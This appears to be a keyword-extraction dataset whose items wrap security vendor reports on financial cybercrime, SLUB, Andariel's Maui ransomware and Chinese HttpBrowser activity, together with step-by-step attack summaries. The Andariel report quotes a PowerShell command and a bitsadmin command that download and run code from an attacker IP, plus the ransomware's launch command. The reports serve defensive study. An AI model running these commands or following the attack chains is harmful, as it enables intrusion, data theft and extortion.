projects.Head of Mules (Mule “project” leader) Head of mules is a representative of the criminal group working closely with the people involved in the process of stealing money. The function of the mules is to get the stolen money, cash it and transfer to the criminal group its due share. To do this, the head of mules builds their own infrastructure, which consists of legal entities and individuals with their own bank accounts, to which the stolen money is transferred and from which it is later withdrawn and moved into the pockets of the fraudsters. The mule project leader cooperates with the organizer of the criminal group, and provides them with the numbers of the accounts to which the money loader sends the stolen money. Both mule project leaders and money flow managers work on commission which, according to the information obtained by Kaspersky Lab during the course of investigation, can amount to half the sum stolen.Mule “projects” Mule projects are a vital component of any financial cybercrime. Such groups comprise one or more organizers and up to several dozen individual mules.A mule (or drop) is a holder of a means of payment who, on command from the money mules manager, cashes the money received into their/an account, or transfers it to another account as specified by the money mules manager.Mules can be divided into two types: duped and non-duped. Duped mules are people who, at least at the beginning of their cooperation with the money mules manager, do not realize they are involved in a criminal scheme. As a rule, the task of getting and transferring money is presented to them under some plausible pretext. For example, the money mules manager can establish a legal entity and appoint to an executive position (the general or financial director, for example) a person who will perform the functions of the duped mule: such as signing corporate documents which will, in fact serve as a legal screen for withdrawing stolen money.Non-duped mules are well aware of the real purpose of the money mules manager’s tasks.The options used by the mule projects to withdraw money are manifold. Depending on the amount of money stolen, they may include individual credit card holders ready to cash money and give it to the representative of the money mules manager for a small fee, or17Kaspersky LabRussian financial cybercrime: how it works.specially created legal entities, whose representatives open ""salary projects"" (credit cards for transferring the salaries of company employees) at their corporate bank.Yet another common method for constructing a mule scheme is for non-duped mules to open dozens of accounts at different banks.This advert offers sets of payment cards (the card, the documents based on which the card was authorized, the SIM card with which the bank account of the card is associated) that can be used for cashing stolen money. For sale is the card issued by Russian banks and banks from neighboring countries, as well as banks from the countries of Europe, Asia and the United States. The Momentum-type set is costs 3000 rubles (less than $50), the set with the Platinum card - eight thousand rubles (about $120).When the theft occurs outside of Russia, the role of the non-duped mules is performed by a citizen or group of citizens of an Eastern Europe country, who within a short period of time visit several countries on the continent and in each of them open accounts in their names. Then the non-dupe mules provide the money mules manager with the data to access all these accounts. These accounts are used later to withdraw the stolen money.18Kaspersky LabRussian financial cybercrime: how it works.An example of an ad offering for sale a list of companies registered in the Russian Federation and in the offshore zone. The services of cybercriminals cost from $560 to $750.Stuffers The word ""stuffer"" comes from the word “stuff” (a colloquial word for ""goods""). One way to withdraw stolen money is by buying goods in e-stores with the stolen money, reselling them and returning to the fraudsters their due percent. This is done by the stuffers, members of the cybercriminal groups engaged in spending money from compromised accounts on purchasing goods in online stores.In fact, a stuffer is a variation of the money flow manager. Withdrawing money by purchasing goods is generally practiced if the stolen sums are relatively small. As a rule, the stuffers work in a team with the fences. Working ""in tandem"" often involves purchasing a certain type of goods, sometimes from a specific manufacturer or a clearly-defined model.Organizer If we consider cybercrime as a project, the organizer of the criminal group is its general manager. Their duties usually include financing the preparatory phase of the attack, allocating tasks to executors, monitoring their performance and interacting with third-party agents such as mule projects and call services (if the group does not have its own). The organizer determines the targets for attacks, selects the necessary ""specialists"" and negotiates with them.Stages of the attacksIt should be noted that the above classifications are not set in stone. In some cases, a single member of the criminal group can combine several roles. Nevertheless, regardless of how many people execute them, each of the roles described can be found when investigating almost every money-related cybercriminal incident. Here's how they work in ""real time.""1. Exploration. When it comes to targeted attacks on a specific company, the organizer first instructs the contractors to collect information about the company, which will help to develop a plausible social engineering scheme for the first stage of attack. If we are talking about an19Kaspersky LabRussian financial cybercrime: how it works.attack on individual users, the preliminary exploration stage is skipped or limited to choosing a ""target audience"" for the attack (for example, the users of the online banking service of a specific bank) and creating phishing emails and phishing sites with relevant content.2. Infection. Penetration of the corporate network is performed by spear-phishing or a phishing mass-mailing that contains an attachment with the special document or a malicious web-link. Opening the attachment or following the link leads to malware infection. Often, infection occurs automatically without the user’s awareness or participation - after clicking on the link, a malicious program is automatically downloaded on the user’s computer (drive-by download) and runs on it.In other cases, infection is carried out via compromised popular sites on which a tool is placed that invisibly redirects users to a third-party site containing a set of exploits. Once on this site, the user will be infected with malware.Once inside the system cybercriminals use a number of malicious tools to consolidate their presence. For example, to ensure that internal sites of compromised organizations have the malware reinstalled when the organization’s security software deletes the previous version. In addition, attackers are often set up within the infrastructure software of the attacked organization, enabling easy access to the internal corporate network from outside.3. Exploration and implementation. The programs for remote, hidden administration and management are downloaded onto compromised computers. They are used by cybercriminals to gain system administrators’ credentials. Legal programs for remote management and administration whose functionality is known to many users are often used for this.4. Money theft. In the final stage, cybercriminals access the financial systems of the targeted organization and transfer money from its accounts to the accounts of the mule projects or withdraw money directly at ATMs.ConclusionFinancial cybercrime backed by Russian-speaking criminals has become widespread in recent years and this growth is due to a number of causes. The main ones are:• Not enough qualified staff in law enforcement agencies; •Inadequate legislation allowing criminals in many cases to avoid responsibility or to receive a lighter sentence;• A lack of established procedures for international cooperation between lawenforcement agencies and expert organizations in different countries.Unlike the real world, a robbery in cyberspace usually goes unnoticed and there is a very small window for collecting digital evidence after the crime. Further, criminals have no need to stay in the country where the crime is committed.Unfortunately, for Russian-speaking cybercriminals current conditions are more than favorable: the risk of prosecution is low while the potential rewards are high. As a result, the20Kaspersky LabRussian financial cybercrime: how it works.number of crimes and the damage caused by them is growing, and the market for cybercriminal services is increasing momentum.The lack of established mechanisms for international cooperation also plays into the hands of criminals: for example, Kaspersky Lab experts know that the members of some criminal groups permanently reside and work in Russia's neighbors, while the citizens of the neighboring states involved in criminal activity often live and operate in the territory of the Russian Federation.Kaspersky Lab is doing everything possible to terminate the activity of cybercriminal groups and encourages other companies and law enforcement agencies in all countries to cooperate.The international investigation of Carbanak’s activity, initiated by Kaspersky Lab, is the first example of successful international cooperation. If the world is to see a serious and positive change there should be more such cases.21Kaspersky LabRussian financial cybercrime: how it works.Reference. What is Kaspersky Lab Computer Incidents Investigation?Kaspersky Lab is a well-known developer of anti-malware security solutions. But the company provides comprehensive protection, and this also includes services for computer incidents investigation.Evidence of an incident, mainly presented in the form of digital data, needs to be collected and recorded so that there are no grounds for doubt in the investigation and trial when a victim makes a court application.Kaspersky Lab Computer Incidents Investigation is responsible for:• Responding to IT security incidents and providing a quick analysis of the situation;• Collecting digital evidence and determining the circumstances of IT security incidentsin accordance with established procedures;• Analyzing the evidence collected, searching the information related to thecircumstances of the incident on the Internet and fixing them;• Preparing materials for the victim’s application to law enforcement agencies;• Providing expert support to investigative operations.A huge amount of data is processed when responding to IT security incidents and supporting investigative operations. The analysis of this data, in combination with statistics on malicious objects detected identifies the trends of criminal behavior in cyberspace.The Kaspersky Lab Computer Incidents Investigation Department was established in 2011 and involves six forensic experts.22Kaspersky Lab ","{'phrases': ['Exploration', 'information', 'the target', 'a plausible social engineering scheme', 'infection', 'the corporate network', 'phishing emails', 'drive-by download', 'downloads', 'implementation', 're', 'access', 'tools', 'Money theft', 'payment cards'], 'target': 'Exploration; information; the target; a plausible social engineering scheme; infection; the corporate network; phishing emails; drive-by download; downloads; implementation; re; access; tools; Money theft; payment cards.'}"
the attack; CVE-2018-0834; CVE-2019-0752; a VBScript engine vulnerability; the malware; control; communications; Slack; Slack malware; a unique watering hole website; CVE-2019-0752; the SLUB loader; the victim; the exploit code; a.NET process; use; the SLUB loader; configuration files; the controller; COM; access.,"[""1. The attacker compromises websites supportive of the North Korean government and injects them with exploits for either CVE-2018-8174 or CVE-2019-0752. 2. The victim browses to the compromised website with an unpatched version of Internet Explorer. 3. The exploit triggers a download of the SLUB malware loader. 4. The loader contains privilege escalation exploits that allow it to gain higher privileges on the victim's system. 5. The loader checks the system architecture and downloads either the 32-bit or 64-bit version of the main SLUB malware. 6. The malware connects to a Slack workspace set up by the attackers for command and control. 7. The malware creates a unique channel for the victim within the Slack workspace. 8. The attackers post pinned messages in the victim's channel containing commands. 9. The malware parses the pinned messages and executes commands like taking screenshots, listing files, etc. 10. The malware uploads any output from commands back to the attackers via the Slack channel. 11. The attackers can dynamically update the Slack API tokens for command and control by modifying a hardcoded website. ""]","Extract the keywords: 7/19/2019SLUB Gets Rid of GitHub, Intensiﬁes Slack Use - TrendLabs Security Intelligence BlogTrend Micro About TrendLabs Security Intelligence BlogHome » Malware » SLUB Gets Rid of GitHub, Intensiﬁes Slack UseSLUB Gets Rid of GitHub, Intensiﬁes Slack UsePosted on:July 16, 2019 at 5:01 am Posted in:Malware, Vulnerabilities Author: Trend Micro0by Cedric Pernet, Elliot Cao, Jaromir Horejsi, Joseph C. Chen, William Gamazo Sanchez Four months ago, we exposed an attack that leveraged a previously unknown malware that Trend Micro named SLUB. The past iteration of SLUB spread from a unique watering hole website exploiting CVE-2018- 8174, a VBScript engine vulnerability. It used GitHub and Slack as tools for communication between the malware and its controller. On July 9, we discovered a new version of SLUB delivered via another unique watering hole website. This malicious site used CVE-2019-0752, an Internet Explorer vulnerability discovered by Trend Micro’s Zero Day Initiative (ZDI) that was just patched this April. This is the ﬁrst time we found this exploit used in the wild. This new version of the SLUB malware has stopped using GitHub as a way to communicate, heavily using Slack instead via two free workspaces. Slack is a collaborative messaging system that lets users create and use their own workspaces through the use of channels, similar to the internet relay chat (IRC) system. Slack has since shut down the relevant Workspaces. Coincidence or not, both websites that have delivered the SLUB malware are supportive of the North Korean The SLUB malware was delivered through watering hole websites that were injected with exploits for CVE- 2018-8174 or CVE-2019-0752. A victim browsing the websites with an unpatched Internet Explorer browser will be infected with a SLUB loader. Listed below are the steps that the exploit script performs to execute the loader. The infection chain is similar to the previous iteration of SLUB; however, this version employs different techniques to bypass AV heuristics and machine learning algorithms:Open PowerShell for delivery mechanism with hidden WindowStyle and obfuscation.urlﬁes-slack-use/?utm_campaign=shareaholic&utm_medium=facebook&… 1/67/19/2019SLUB Gets Rid of GitHub, Intensiﬁes Slack Use - TrendLabs Security Intelligence BlogUsing Rundll32 to invoke a “C++ runtime impersonated name” malicious DLL (impersonated dll name: mfcm14u.dll) downloaded from watering hole website. The malicious DLL implements export symbols following the Windows Naming Convention and uses actual Windows API name: AfxmReleaseManagedReferences. Note that this combination of naming conventions could help the attackers to bypass ML algorithms.Figure 1. PowerShell script to download and launch SLUB loaderThe PowerShell script will look at the architecture of the system to check which malicious DLL ﬁles should be downloaded. The malicious DLL ﬁles are actually the SLUB loader. In case of a x86 system, a 32-bit SLUB loader will be downloaded and CVE-2019-0808, a relatively new vulnerability patched in March, will be used. In a x64 system, a 64-bit SLUB loader will be downloaded and CVE-2019-0803, another new vulnerability patched in April, will be leveraged. Both are exploited for privilege escalation on Windows. Then, the loader will check the architecture of the system to decide if it will download and use either the x86 version or x64 version of the SLUB malware to infect the victim. All the exploits, loaders, and SLUB malware were directly hosted on watering hole websites.Figure 2. Infection chain of SLUB malwareFigure 3. Trafﬁc Pattern of SLUB malware infection chainurlﬁes-slack-use/?utm_campaign=shareaholic&utm_medium=facebook&… 2/6SLUB Gets Rid of GitHub, Intensiﬁes Slack Use - TrendLabs Security Intelligence Blog7/19/2019 The backdoor Since we published out last report on SLUB, the backdoor has been updated and several improvements were implemented. The most notable change is the complete adoption of Slack as an avenue to organize victim machines and give commands. Here are the changes in detail:Github is not used anymore Operator creates a Slack workspace Each infected machine joins the workspace, a separate channel named <use_name>-<pc_name> is created in the workspace Command and control (C&C) communication only uses these Slack channels; if the operator wants to execute a command on an infected machine, he inserts a message to a victim-speciﬁc channel and pins this message Victim machine reads pinned messages from its dedicated channel, parses the message, and executes the requested commandAside from these changes we also found new information from two Slack tokens we found hardcoded into binary (similar to the previous version).These tokens can be used to query the Slack API for some metadata information, such as team info, user list, channel list (which in this case would be the victims). Investigating this information reveals that, at the time of this research, the workspace has been active since at least the end of May and one of the users had their time zone set to “Korea Standard Time.” When checking both token response headers, we can see the following difference in OAuth scopes: C&C token:Notify token:The C&C token contains “admin” in its OAuth scope, which allows it to “administer your workspace.” If the operator needs to change these tokens, then he can update them by updating the content of the toni132[.]pen[.]io webpage. The source code of this webpage is parsed for certain keywords: HELLO^, WHAT^, !!!. If the desired keywords are found, tokens are parsed out and updated:urlﬁes-slack-use/?utm_campaign=shareaholic&utm_medium=facebook&… 3/67/19/2019SLUB Gets Rid of GitHub, Intensiﬁes Slack Use - TrendLabs Security Intelligence BlogCommand communication In detail, the communication works as follows: If the operator (one of the users from user list) wants to send a command to the victim, he posts and pins a message onto the corresponding channel. The text value of the message speciﬁes which command should be executed. The example below shows a “capture” command for taking screenshot, pinned to a certain channel by an operator.The command for listing ﬁles in a given directory may look like the following:And listing all ﬁles on the victim’s desktop may look like the following:urlﬁes-slack-use/?utm_campaign=shareaholic&utm_medium=facebook&… 4/67/19/2019SLUB Gets Rid of GitHub, Intensiﬁes Slack Use - TrendLabs Security Intelligence BlogThe victim machine then reads the command, executes it, and (in the case of taking a screenshot) it responds by uploading the screenshot and sharing the link to the ﬁle. Notice the “upload” value is set to “true.”Other supported commands are exec, dnexec, capture, ﬁle, drive, reg, and tmout, which are similar to the ones we described in our previous post on SLUB. In the case of running a command, the command output results are uploaded to ﬁle.io, the same as in the previous post. During this attack, we found that the SLUB malware used two Slack teams “sales-yww9809” and “marketing-pwx7789.” The workspaces creation time is unknown. Inside team sales-yww9809, it contained two users, Lomin (lomio8158@cumallover[.]me) and Yolo (yolo1617@cumallover[.]me) who were both created on the same day (May 23, 2019). Lomin’s timezone was GMT time and mentioned Africa/Monrovia, while Yolo’s was Korea Standard Time and mentioned Asia/Seoul. The other team, marketing-pwx7789, also has two users named Boshe (boshe3143@ﬁremail[.]cc) and Forth (misforth87u@cock[.]lu). They were also created on the same day (April 17, 2019). And similar to previous one, Boshe has the timezone set in Africa/Monrovia with GMT while Forth is in Asia/Seoul with Korea Standard Time. These email addresses used a free encrypted email service; we could not ﬁnd additional information on those Once again, this attack shows a professional level when it comes to the OpSec deployed. The constant use of online services like Slack, cock.li, and pen.io makes it harder to track this threat actor. Similar to the previous variant, this one has been very discreet and has not been spread at a wide scale. We could not ﬁnd any other variant anywhere else, nor did we ﬁnd any other ongoing campaign run by these attackers. We are once again conﬁdent that this attack targets speciﬁc individuals visiting that particular watering hole, with surveillance as a highly probable ﬁnal goal. In response to this incident, Slack replied with the following:As noted in their previous post, and detailed further in this new post, Trend Micro has discovered, and is actively tracking, a third party that is attempting to use targeted malware known as SLUB, and which attempts to use Slack related to this effort. As part of the Trend Micro investigation, we were made aware of free workspaces being used in this manner. We investigated and immediately shut down the reported Slack Workspaces as a violation of our terms of service. We conﬁrmed that Slack was not compromised in any way as part of this incident. We are committed to preventing the misuse of our platform and we will take action against anyone who violates our terms of serviceTrend Micro Deep Security customers are protected by the following rules:urlﬁes-slack-use/?utm_campaign=shareaholic&utm_medium=facebook&… 5/67/19/2019SLUB Gets Rid of GitHub, Intensiﬁes Slack Use - TrendLabs Security Intelligence Blog1009067-Microsoft Windows VBScript Engine Remote Code Execution Vulnerability (CVE-2018- 8174) 1009655-Microsoft Internet Explorer Scripting Engine Memory Corruption Vulnerability (CVE-2019- 0752) 1009647-Microsoft Windows GDI Elevation Of Privilege Vulnerability (CVE-2019-0803) 1009582-Microsoft Windows Win32k Elevation Of Privilege Vulnerability (CVE-2019-0808)Indicators of compromise Cve-2018-8174 Board_main.php Cve-2019-0752 Thumb- Slub loader (cve- Slub loader (cve- Slub loader (cve- Slub loader (cve- Slub malware (x32) Slub malware (x32) 637155112_zlwxf13b_eab192a Slub malware (x64) 5.jpg Slub malware (x64) 637155112_zlwxf13b_eab192a a15.jpg Slub malware (x64) 637155112_zlwxf13b_eab192a a17.jpgurlﬁes-slack-use/?utm_campaign=shareaholic&utm_medium=facebook&… 6/6 ","{'phrases': ['the North Korean', 'exploits', 'CVE-2018-8174', 'the victim', 'Internet Explorer', 'The exploit', 'the SLUB malware', 'the loader', 'privilege escalation', 'the system', '32-bit', '64-bit', 'the malware', 'a Slack workspace', 'the attackers', 'control', 'pinned messages', 'commands', 'exec', 'screenshot', '10', '11', 'the Slack API', 'tokens'], 'target': 'the North Korean; exploits; CVE-2018-8174; the victim; Internet Explorer; The exploit; the SLUB malware; the loader; privilege escalation; the system; 32-bit; 64-bit; the malware; a Slack workspace; the attackers; control; pinned messages; commands; exec; screenshot; 10; 11; the Slack API; tokens.'}"
Andariel; a variant; DTrack; Malware; Windows; command; encrypt; the infected host; a remote server; HTTP; the infected host; February 2021.,"['1. Andariel compromises internet-facing web services like WebLogic servers using exploits for vulnerabilities such as CVE-2017-10271. 2. The compromised servers are used to distribute Powershell scripts that retrieve additional scripts and tools like 3proxy. 3. The scripts install malware like DTrack, which gathers system information and data for exfiltration. 4. DTrack is used to collect data and maintain persistence on systems for several months. 5. Eventually, Maui ransomware is deployed onto selected systems, about 10 hours after DTrack. 6. Maui encrypts files on the system and leaves a ransom note demanding cryptocurrency payment. 7. Andariel selectively deploys Maui to target organizations likely to yield financial gain from ransoms. 8. The ransomware asks for payment in exchange for the decryption key to recover encrypted files. ']","Extract the keywords: securelist.com /andariel-deploys-dtrack-and-maui-ransomware/107063/ Andariel deploys DTrack and Maui ransomwareAuthorsKurt BaumgartnerSeongsu ParkOn July 7, 2022, the CISA published an alert, entitled, “North Korean State-Sponsored Cyber Actors Use Maui Ransomware To Target the Healthcare and Public Health Sector,” related to a Stairwell report, “Maui Ransomware.” Later, the Department of Justice announced that they had effectively clawed back $500,000 in ransom payments to the group, partly thanks to new legislation. We can confirm a Maui ransomware incident in 2022, and add some incident and attribution findings.We extend their “first seen” date from the reported May 2021 to April 15th 2021, and the geolocation of the target, to Japan. Because the malware in this early incident was compiled on April 15th, 2021, and compilation dates are the same for all known samples, this incident is possibly the first ever involving the Maui ransomware.While CISA provides no useful information in its report to attribute the ransomware to a North Korean actor, we determined that approximately ten hours prior to deploying Maui to the initial target system, the group deployed a variant of the well-known DTrack malware to the target, preceded by 3proxy months earlier. This data point, along with others, should openly help solidify the attribution to the Korean- speaking APT Andariel, also known as Silent Chollima and Stonefly, with low to medium confidence. Background1/6We observed the following timeline of detections from an initial target system:1. 2020-12-25 Suspicious 3proxy tool 2. 2021-04-15 DTrack malware 3. 2021-04-15 Maui ransomwareDTrack malwareMD5 2021-03-30 02:29:15 PE32 executable (GUI) Intel 80386, for MS Windows VS2008 build 21022 1.2 MB C:\Windows\Temp\temp\mvhost.exeOnce this malware is spawned, it executes an embedded shellcode, loading a final Windows in-memory payload. This malware is responsible for collecting victim information and sending it to the remote host. Its functionality is almost identical to previous DTrack modules. This malware collects information about the infected host via Windows commands. The in-memory payload executes the following Windows variant did. Compared to the old version of DTrack, the new information-gathering module sends stolen information to a remote server over HTTP, and this variant copies stolen files to the remote host on the same network. Maui ransomwareThe Maui ransomware was detected ten hours after the DTrack variant on the same server.MD5 2021-04-15 04:36:00 PE32 executable (GUI) Intel 80386, for MS Windows2/6File size File name763.67 KB C:\Windows\Temp\temp\maui.exeMultiple run parameters exist for the Maui ransomware. In this incident, we observe the actors using “-t” and “- x” arguments, along with a specific drive path to encrypt:1 C:\Windows\Temp\temp\bin\Maui.exe -t 8 -x E:In this case, “-t 8” sets the ransomware thread count to eight, “-x” commands the malware to “self melt”, and the “E:” value sets the path (the entire drive in this case) to be encrypted. The ransomware functionality is the same as described in the Stairwell report.The malware created two key files to implement file encryption:RSA private key RSA public key Similar DTrack malware on different victimsC:\Windows\Temp\temp\bin\Maui.evd C:\Windows\Temp\temp\bin\Maui.keyPivoting on the exfiltration information to the adjacent hosts, we discovered additional victims in India. One of these hosts was initially compromised in February 2021. In all likelihood, Andariel stole elevated credentials to deploy this malware within the target organization, but this speculation is based on paths and other artifacts, and we do not have any further details.MD5 2021-02-22 05:36:16 PE32 executable (GUI) Intel 80386, for MS Windows 848 KBThe primary objective of this malware is the same as in the case of the aforementioned victim in Japan, using different login credentials and local IP address to exfiltrate data.Windows commands to exfiltrate dataFrom the same victim, we discovered additional DTrack malware (MD5 Additional DTrack module and initial infection methodThe “3Proxy” tool, likely utilized by the threat actor, was compiled on 2020-09-09 and deployed to the victim on 2020-12-25. Based on this detection and compilation date, we expanded our research scope3/6and discovered an additional DTrack module. This module was compiled 2020-09-16 14:16:21 and detected in early December 2020, having a similar timeline to the 3Proxy tool deployment.MD5 2020-09-16 14:16:21 PE32 executable (GUI) Intel 80386, for MS Windows VS2008 build 21022 136 KB %appdata%\microsoft\mmc\dwem.certThis DTrack module is very similar to the EventTracKer module of DTrack, which was previously reported to our Threat Intelligence customers. In one victim system, we discovered that a well-known simple HTTP server, HFS7, had deployed the malware above. After an unknown exploit was used on a vulnerable HFS server and “whoami” was executed, the Powershell command below was executed to fetch an additional Powershell script from the remote server:1 C:\windows\system32\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('hxxp://145.232.235[.]222/usr/users/mini.ps1')The mini.ps1 script is responsible for downloading and executing the above DTrack malware via bitsadmin.exe:1bitsadmin.exe /transfer myJob /download /priority high2""hxxp://145.232.235[.]222/usr/users/dwem.cert"" ""%appdata%\microsoft\mmc\dwem.cert""The other victim operated a vulnerable Weblogic server. According to our telemetry, the actor compromised this server via the CVE-2017-10271 exploit. We saw Andariel abuse identical exploits and compromise WebLogic servers in mid-2019, and previously reported this activity to our Threat Intelligence customers. In this case, the exploited server executes the Powershell command to fetch the additional script. The fetched script is capable of downloading a Powershell script from the server we mentioned above (hxxp://145.232.235[.]222/usr/users/mini.ps1). Therefore, we can summarize that the actor abused vulnerable Internet-facing services to deploy their malware at least until the end of 2020. VictimsThe July 2022 CISA alert noted that the healthcare and public health sectors had been targeted with the Maui ransomware within the US. However, based on our research, we believe this operation does not target specific industries and that its reach is global. We can confirm that the Japanese housing company was targeted with the Maui ransomware on April 15, 2021. Also, victims from India, Vietnam, and Russia were infected within a similar timeframe by the same DTrack malware as used in the Japanese Maui incident: from the end of 2020 to early 2021.Our research suggests that the actor is rather opportunistic and could compromise any company around the world, regardless of their line of business, as long as it enjoys good financial standing. It is probable4/6that the actor favors vulnerable Internet-exposed web services. Additionally, the Andariel deployed ransomware selectively to make financial profits.AttributionAccording to the Kaspersky Threat Attribution Engine (KTAE), the DTrack malware from the victim published/reported by Symantec – note that Symantec recently described the Backdoor.Preft malware as “aka Dtrack, Valefor”. Apart from the code similarity, the actor used 3Proxy tool (MD5 attributes StoneFly as the North Korean-linked actor behind the DarkSeoul incident. ConclusionsBased on the modus operandi of this attack, we conclude that the actor’s TTPs behind the Maui ransomware incident is remarkably similar to past Andariel/Stonefly/Silent Chollima activity:Using legitimate proxy and tunneling tools after initial infection or deploying them to maintain access, and using Powershell scripts and Bitsadmin to download additional malware; Using exploits to target known but unpatched vulnerable public services, such as WebLogic and HFS; Exclusively deploying DTrack, also known as Preft; Dwell time within target networks can last for months prior to activity; Deploying ransomware on a global scale, demonstrating ongoing financial motivations and scale of interest5/66/6 ","{'phrases': ['Andariel', 'compromise', 'WebLogic servers', 'exploits', 'CVE-2017-10271', 'Powershell scripts', 'tools', '3proxy', 'malware', 'dtrack', 'information', 'data', 'exfiltration', 'months', 'Maui Ransomware', 'files', 'payment', 'Target', 'the ransomware'], 'target': 'Andariel; compromise; WebLogic servers; exploits; CVE-2017-10271; Powershell scripts; tools; 3proxy; malware; dtrack; information; data; exfiltration; months; Maui Ransomware; files; payment; Target; the ransomware.'}"
threat actors; PE; malware; access; the attacker; Targets; a domain; the registrant; adobesys[.]com; the malware; system information; keystrokes; the victim.,"[' 1. The attackers registered the C2 domain adobesys[.]com using an email associated with previous attacks. 2. They compromised targets using the HttpBrowser malware variant, which had low AV detection. 3. The malware sent system info to the C2 servers and allowed remote access. 4. The attackers likely used strategic web compromises or spearphishing to infect specific targets with access to drone and energy management IP. 5. They maintained persistent access to steal IP, communications, and documents to benefit Chinese companies. ']","Extract the keywords: 2016/10/20ThreatConnect discovers Chinese APT activity in two European companiesOCTOBER 17, 2016A Tale of Two TargetsIN BLOG, FEATURED ARTICLE, RESEARCH, THREAT RESEARCH BY THREATCONNECTThreatConnect identifies Chinese targeting of two companies. Economic espionage or military intelligence?It was the best of times; it was the worst of times. While Russian advanced persistent threat (APT) activity against the US and other international organizations [url utm_campaign=DNC%20Guccifer%202.0%20Fancy%20Bears%20Research&utm_medium=social&utm_source=twitter] has dominated the headlines recently, Chinese APT actors have been active outside the limelight. In June 2016, Chinese APT actors were discovered using a customized implant within the network of a European consumer electronics company that specializes in drone technologies and a U.S. subsidiary of a French energy management company that builds infrastructure for the U.S. government and the Department of Defense. Chinese e orts against the European consumer drone company appear to be economically motivated and represent a deviation from the September 2015 agreement [url 63b9-11e5-8e9e-dce8a2a2a679_story.html] between the U.S. and China to disavow economic espionage. Due to their involvement with the U.S. military, it could be argued targeting the energy management company was for military intelligence and not economic espionage.Using the Diamond Model of Intrusion Analysis, [url we will start by walking through the technical axis of the attack where we found malware used by multiple Chinese APTs calling back to a domain with the same registrant as those used in the 2015 Anthem and OPM breaches. We’ll pivot to the socio-political axis of the attack, and discuss how the victims  t the targeting pro le of at least one Chinese APT – although we are unable to attribute the attack to a speci c Chinese APT at this time.url discovers Chinese APT activity in two European companiesCapabilities: HttpBrowser BackdoorOn June 08, 2016 ThreatConnect identi ed a malicious executable MD5: 3BEA073FA50B62C561CEDD9619CD8425. This malware is a variant of “HttpBrowser,” a backdoor used by multiple Chinese APTs, including EMISSARY PANDA (aka APT27/TG-3390 [url ) and DYNAMITE PANDA [url mechanism/] (aka APT18/Wekby/TG-0416). Some reports refer to [url HttpBrowser as the GTalk trojan or “Token Control.” According to TrendMicro [url , HttpBrowser allows a threat actor to spawn a reverse shell, upload or download  les, and capture keystrokes on a compromised system, similar to other remote administration tools (RATs). Antivirus detection for HttpBrowser is extremely low and typically based upon heuristic signatures. The report also indicates HttpBrowser is not available on underground markets.Several variants of the HttpBrowser backdoor exist; however, in this particular sample beaconing network tra c stands out as the telltale “HttpBrowser/1.0” User-Agent string is replaced with “Mozilla/5.0 (Windows; U; Windows NT 5.2) Gecko/%lu Firefox/3.0.1”, where %lu is a format modi er that appends an unsigned long numerical data type to the user-agent string.url discovers Chinese APT activity in two European companiesThe malware sends system information using the query string “computer=<COMPUTER NAME>&lanip=<LAN IP>&uid=<Unique ID>&os=<OS VERSION>&relay=<RELAY NUMBER>&data=<DATA>”Infrastructure: Adobesys[.]com and a familiar registrantLeveraging ThreatConnect’s WHOIS function, we identi ed the malware’s hardcoded command and control domain adobesys[.]com was registered by the Chinese domain reseller and mass registrant, li2384826402[@]yahoo[.]com. This email address is infamous for registering domains used in the DEEP PANDA-attributed Anthem [url anthem-hack-all-roads-lead-to-china/] and OPM [url attacks in 2015, and provides additional evidence tying this HttpBrowser activity to Chinese APT actors.Using ThreatConnect’s Farsight Passive DNS integration, we can identify the adobesys[.]com domain was hosted at two IP addresses — 173.231.11[.]24 and 185.92.222[.]81 — while the domain most likely was operational. One other domain, newsoft2[.]com, was hosted at the 185.92.222[.]81 IP during the same timeframe as adobesys[.]com. WHOIS information indicates that newsoft2[.]com was also registered by a Chinese registrant (omyname@gmail[.]com), and its co-location with the malicious adobesys[.]com domain suggests that it may be operated by the same actors behind the HttpBrowser activity. Indicators from this activity have been shared in incident 20151228A: Chinese HttpBrowser Activity Targeting European Companies [url .Victims: Two TargetsWe provided a lead on the malware and adobesys[.]com to a partner, who collected associated network tra c and worked with us to analyze the activity. In this case, the activity was targeted against only a few companies. We determined the Chinese actors used the “HttpBrowser” backdoor variant to target a control systems engineer in product development at a European consumer drone company. The tra c also helped us identify another target: the U.S. subsidiary of a French energy management company that has contracts with the U.S. Department of Defense and other U.S. government elements to implement energy management and SCADA solutions.Both organizations were alerted to this activity shortly after it was discovered. At this time, we have no indication what, if any, data was stolen from them.url discovers Chinese APT activity in two European companiesDOWNLOAD OUR WHITEPAPER - FRAGMENTATION: THE SILENT KILLER OF YOUR SECURITY MANAGEMENTPROGRAM [HTTPS://WWW.THREATCONNECT.COM/WP-CONTENT/UPLOADS/THREATCONNECT-WHITEPAPER-FRAGMENTATION.PDF?UTM_CAMPAIGN=DNC%20GUCCIFER%202.0%20FANCY%20BEARS%20RESEARCH&UTM_MEDIUM=TALE%20BLOG&UTM_SOURCE=CHINESE%20APT]Adversary: Pondering the PANDAsWhile we cannot state for certain which Chinese APT is behind this activity, [url targeting a consumer drone company and energy management company is most consistent with previous EMISSARY PANDA targeting. Both EMISSARY and DYNAMITE PANDA have previously targeted the defense and aerospace industries, among others; however, EMISSARY PANDA is the only one of the two known to have targeted energy companies. [url According to the Secureworks report [url , EMISSARY PANDA commonly conducts strategic web compromises (SWCs), also known as watering hole attacks, on websites associated with the target organization’s industry to increase the likelihood of compromising victims with relevant information. EMISSARY PANDA also uses spearphishing emails to target speci c victims. At this time we do not know whether SWCs or spearphishing emails were used to target the victim organizations.Socio-Political: Discussing Possible MotivationsThe HttpBrowser sample piqued our interest since the information security community has had a heightened focus on whether or not Beijing is abiding by the September 2015 agreement [url in-economic-cyberespionage/2015/09/25/90e74b6a-63b9-11e5-8e9e-dce8a2a2a679_story.html] between U.S. and China to disavow economic espionage. The U.S. subsidiary of the French energy management company looks like an artful dodge. These dual use organizations – those that possess signi cant intellectual property and are also involved with the U.S. government – present tempting targets for China that could facilitate a variety of espionage e orts. However, China could claim such activity constitutes military espionage and therefore does not violate the agreement between Presidents Obama and Xi from last September.By contrast, targeting the European civilian drone maker looks like a case of economically motivated espionage. The world’s largest and most popular drone manufacturer is China’s DaJiang Innovation Technology (DJI), which currently holds about 70% of the commercial drone market share [url ight/drones/a18486/6-reasons-dji-is-winning-the-drone- wars/] and was valued at over $10 billion in May 2015 [url numbers-everyone-should-know.aspx] . The emerging global market for business services using commercial drones was recently valued at over $127 billion [url valued-at-over--127-bn/s/AC04349E-C40D-4767-9F92-A4D219860CD2] due to the growing applicability of drones across industries including agriculture, mapping, and surveillance.In this instance, China most likely is seeking to quash any competition posed to DJI’s command of the market. Within the command and control tra c we were able to identify that a control systems 